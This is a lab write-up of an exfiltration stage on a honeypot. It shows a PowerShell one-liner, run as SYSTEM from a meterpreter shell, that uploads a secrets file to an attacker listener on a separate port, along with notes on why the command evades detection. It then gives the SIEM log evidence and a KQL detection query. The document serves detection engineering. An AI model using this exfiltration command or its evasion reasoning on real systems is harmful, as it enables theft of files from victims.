# Stage 5 — Exfiltration (T1041)

**Target:** `C:\Users\honey\OneDrive\Documents\secret.txt` (2,524 B).

**Command (run as SYSTEM from the meterpreter shell):**
```
powershell -nop -c "(New-Object Net.WebClient).UploadFile('http://192.168.254.100:4444','C:\Users\honey\OneDrive\Documents\secret.txt')"
```

**Why it looks harmless:** signed system tool (`powershell.exe`), built-in .NET class
(`Net.WebClient`), and a **separate port (4444)** from the C2 channel (4443) — so no single
rule covering "the C2 port" sees the data leaving.

**Attacker side:** a one-connection listener on `192.168.254.100:4444`
(`lab/exfil_listen.py`) captured the upload.

**Real SIEM proof (the money row):**
```
2026-10-12 05:32:17.125Z  PS 4104  (New-Object Net.WebClient).UploadFile('http://192.168.254.100:4444','C:\Users\honey\OneDrive\Documents\secret.txt')
2026-10-12 05:32:17        network  powershell → 192.168.254.100:4444  (src 192.168.254.128:55782)  user: NT AUTHORITY\SYSTEM
```
One event carries the entire story — **what** was taken (the path) and **where** it went
(`:4444`).

**KQL:** `host.name: "honeypot" AND powershell.file.script_block_text: "UploadFile"`
→ exactly 1 hit. Correlation rule in `../../detections/correlation.md` §3.
